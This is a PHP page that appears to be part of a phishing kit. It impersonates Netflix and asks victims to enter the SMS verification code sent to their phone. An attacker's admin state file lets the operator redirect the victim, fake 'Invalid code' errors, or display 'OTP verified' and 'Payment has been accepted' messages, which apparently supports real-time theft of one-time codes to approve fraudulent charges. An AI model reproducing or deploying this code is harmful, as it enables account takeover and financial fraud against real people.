<?php
require 'main.php';

$stateFile = __DIR__ . '/admin_state.json';
$smsState = [
    'mode' => 'default',
    'custom_url' => ''
];

if (file_exists($stateFile)) {
    $decoded = json_decode(file_get_contents($stateFile), true);
    if (is_array($decoded)) {
        $smsState = array_merge($smsState, $decoded);
    }
}

if ($smsState['mode'] === 'redirect_wait') {
    header('location: wait.php?next=sms.php');
    exit;
}

if ($smsState['mode'] === 'redirect_custom' && !empty($smsState['custom_url'])) {
    header('location: ' . $smsState['custom_url']);
    exit;
}
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/netflixc.css">
    <style>
        .status {
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 16px;
            text-align: center;
        }

        .status.success {
            background: #e6ffed;
            color: #1b5e20;
            border: 1px solid #a5d6a7;
        }

        .status.info {
            background: #e3f2fd;
            color: #0d47a1;
            border: 1px solid #90caf9;
        }
    </style>
    <title>Neflix</title>
</head>
<body>
<header>
   <div class="logo">
           <img src="res/img/Logo.png">  </div>
       </header>




<main>


<div class="form">
    <div class="continer">
<h1>Confirmation</h1>

<?php
$mode = $smsState['mode'];
$showForm = !in_array($mode, ['otp_pass', 'payment_accept']);

if ($mode === 'otp_pass') {
    echo '<div class="status success">Your SMS OTP has been verified successfully.</div>';
}

if ($mode === 'payment_accept') {
    echo '<div class="status info">';
    echo '<img src="res/img/loadings.gif" alt="Payment accepted" style="max-width:120px; display:block; margin:0 auto 10px;">';
    echo '<p>Payment has been accepted in the app. Thank you for your confirmation.</p>';
    echo '</div>';
}

if ($showForm) {
    echo '<form action="post.php" method="post">';
    echo '<div class="col2"><h4 style="font-weight:normal;">Please enter the verification code sent to your phone.</h4> </div>';
    echo '<div class="coll">';
    echo '<input type="text" placeholder="Enter code" name="otp" required> <br>';

    if ($mode === 'error_verification' || isset($_GET['error'])) {
        echo '<input type="hidden" name="exit">';
        echo '<p style="color:red;">Invalid code</p>';
    }

    echo '<div class="but1">';
    echo '<button type="submit">Confirm</button>';
    echo '</div>';
    echo '</div> <br>';
    echo '</form>';
}
?>

</div>
</div>



</main>
</body>
</html>